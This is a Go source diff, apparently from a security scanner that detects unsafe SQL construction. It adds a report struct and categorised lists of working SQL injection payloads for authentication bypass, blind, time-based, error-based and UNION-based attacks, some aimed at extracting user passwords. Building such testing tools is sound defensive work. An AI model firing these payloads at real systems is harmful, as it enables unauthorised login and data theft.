@@ -8,6 +8,7 @@ import (
 	"io/fs"
 	"path/filepath"
 	"strings"
+	"time"
 )
 
 type Vulnerability struct {
@@ -16,6 +17,80 @@ type Vulnerability struct {
 	File        string
 	// Line  int
 	Line token.Pos
+}
+
+type SqliReport struct {
+	Endpoint     string
+	StatusCode   int
+	ResponseTime time.Time
+	Payload      string
+	PayloadCat   string
+	Success      bool
+}
+
+var AllSqlPayloads = SqlPayloads()
+
+// basic SQL payloads often used for bypassing authentication fields
+var SqlBypassPayloads = []string{
+	"' OR '1'='1",
+	"' OR '1'='1' -- ",
+	"' OR '1'='1' /*",
+	"admin' --",
+	"admin' #",
+	"admin'/*",
+	"' OR 1=1 --",
+	"' OR 1=1 #",
+	"' OR 1=1/*",
+	"OR 1=1",
+	"'='",
+}
+
+// payloads designed to leverage SQL functions and operators to extract information
+var SqlFunctionPayloads = []string{
+	"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 64 --",
+	"' AND LENGTH((SELECT USER())) > 1 --",
+	"' AND ASCII(SUBSTRING((SELECT VERSION()), 1, 1)) > 52 --",
+	"' AND ORD(MID((SELECT SCHEMA_NAME FROM information_schema.schemata LIMIT 1), 1, 1)) > 64 --",
+}
+
+// payloads testing for SQL injection by observing delays in responses.
+var SqlTimePayloads = []string{
+	"'; WAITFOR DELAY '0:0:5' --",
+	"'; IF (1=1) WAITFOR DELAY '0:0:5' --",
+	"'; IF (1=2) WAITFOR DELAY '0:0:5' --",
+	"' AND pg_sleep(5) --",     // For PostgreSQL
+	"'; SELECT pg_sleep(5) --", // For PostgreSQL
+	"' AND SLEEP(5) --",        // For MySQL
+	"' OR SLEEP(5) --",         // For MySQL
+}
+
+// payloads used when there is no visible error message
+var SqlBlindPayloads = []string{
+	"' AND 1=1 --",
+	"' AND 1=2 --",
+	"' OR SLEEP(5) --",
+	"' AND IF(1=1, SLEEP(5), 0) --",
+	"' AND IF(1=2, SLEEP(5), 0) --",
+	"' OR 1=1 LIMIT 1 --",
+	"' OR 1=0 LIMIT 1 --",
+}
+
+// payloads attempting to force the server to return SQL error messages, revealing information about the database structure.
+var SqlErrorPayloads = []string{
+	"' AND 1=CONVERT(int, (SELECT @@version)) --",
+	"' AND 1=CONVERT(int, (SELECT USER())) --",
+	"' AND 1=CONVERT(int, (SELECT database())) --",
+	"' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --",
+}
+
+// payloads trying to leverage SQL's UNION operator to return data from other tables
+var SqlUnionPayloads = []string{
+	"' UNION SELECT NULL, NULL -- ",
+	"' UNION SELECT NULL, NULL, NULL -- ",
+	"' UNION SELECT 1, 'anotheruser', 'password' -- ",
+	"' UNION SELECT username, password FROM users --",
+	"' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
+	"' UNION SELECT table_name FROM information_schema.tables --",
 }
 
 func GetGoFiles(root string) ([]string, error) {
@@ -120,4 +195,15 @@ func UnsafeSqlConstruction(expr ast.Expr) bool {
 		}
 	}
 	return false
+}
+
+func SqlPayloads() []string {
+	var arr []string
+	arr = append(arr, SqlBlindPayloads...)
+	arr = append(arr, SqlTimePayloads...)
+	arr = append(arr, SqlErrorPayloads...)
+	arr = append(arr, SqlUnionPayloads...)
+	arr = append(arr, SqlBypassPayloads...)
+	arr = append(arr, SqlFunctionPayloads...)
+	return arr
 }
